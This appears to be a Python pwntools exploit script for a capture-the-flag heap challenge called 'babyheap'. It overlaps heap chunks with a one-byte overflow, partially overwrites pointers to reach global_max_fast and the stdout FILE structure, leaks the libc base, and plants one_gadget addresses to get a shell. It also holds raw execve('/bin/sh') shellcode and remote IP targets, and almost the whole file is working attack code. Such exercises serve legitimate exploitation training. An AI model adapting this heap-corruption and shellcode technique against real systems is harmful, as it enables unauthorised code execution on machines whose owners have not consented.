#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./babyheap')
if local:
    p = process('./babyheap')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
# payload32 = fmtstr_payload(offset ，{xxx_got:system_mallocr})
# f = FormatStr(isx64=1)
# f[0x8048260]=0x45372800
# f[0x8048260+4]=0x7f20
# f.payload(7)
#shellcode = asm(shellcraft.sh())
#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'

def bk(mallocr):
    gdb.attach(p,"b *"+str(hex(mallocr)))
def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def malloc(idx,size):
    ru("Your choice: ")
    sl('1')
    ru("Which basketball do you want?")
    sl(str(idx))
    ru("how big: ")
    sl(str(size))
def free(index):
    ru("Your choice: ")
    sl('3')
    ru("Which one you do not want?")
    sl(str(index))
def edit(index,content):
    ru("Your choice: ")
    sl('4')
    ru("Which basketball to write?")
    sl(str(index))
    ru("Signature: ")
    sd(content)
def pwn():
	malloc(0,0xf8)
	malloc(1,0xf8)
	malloc(2,0xe8)
	malloc(3,0xf8)
	malloc(4,0xf8)

	free(0)
	payload = 'c' * 0xe0 + p64(0x2f0) + 'a'
	edit(2,payload)
	free(3)
	malloc(0,0x2f0 - 0x10)
	payload = '\x11' * 0xf0 
	payload += p64(0) + p64(0x101)
	payload += '\x22' * 0xf0 + p64(0) + p64(0xf1) + "\n"
	edit(0,payload)
	free(1)
	global_max_fast = 0x77f8
	stdout = 0x77f8 - 0x1229
	payload = '\x11' * 0xf0
	payload += p64(0) + p64(0x101)
	payload += p64(0) + p16(0x77f8 - 0x10) + '\n'
	edit(0,payload)
	# debug(0)
	malloc(3,0xf8)
	malloc(3,0xf8)
	payload = '\x11' * 0xf0 
	payload += p64(0) + p64(0x101)
	payload += '\x22' * 0xf0 + p64(0) + p64(0xf1) + "\n"
	edit(0,payload)
	free(2)
	payload = '\x11' * 0xf0 
	payload += p64(0) + p64(0x101)
	payload += '\x22' * 0xf0 + p64(0) + p64(0xf1)
	payload += p16(stdout) + '\n'
	edit(0,payload)
	malloc(3,0xe8)
	malloc(4,0xe8)
	py = ''
	py += 'a'*0x41 + p64(0xfbad1800) + p64(0)*3 + '\x00' + '\n' 
	edit(4,py)
	rc(0x40)
	libc_base = u64(rc(8)) - 0x3c5600
	onegadget = libc_base + 0xf1147
	print "libc_base--->" + hex(libc_base)
	py = '\x00'+p64(libc_base+0x3c55e0)+p64(0)*3+p64(0x1)+p64(onegadget)*2+p64(libc_base+0x3c5600-8) + '\n'
	edit(4,py)
	#trigger abort-->flush
	malloc(1,1000)
i = 0
while 1:
    print i
    i += 1
    try:
        pwn()
    except EOFError:
        p.close()
        local = 1
        elf = ELF('./babyheap')
        if local:
            p = process('./babyheap')
            libc = elf.libc
            continue
        else:
            p = remote('121.40.246.48',9999)
    else:
        sl("ls")
        break
p.interactive()





# p.interactive()
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
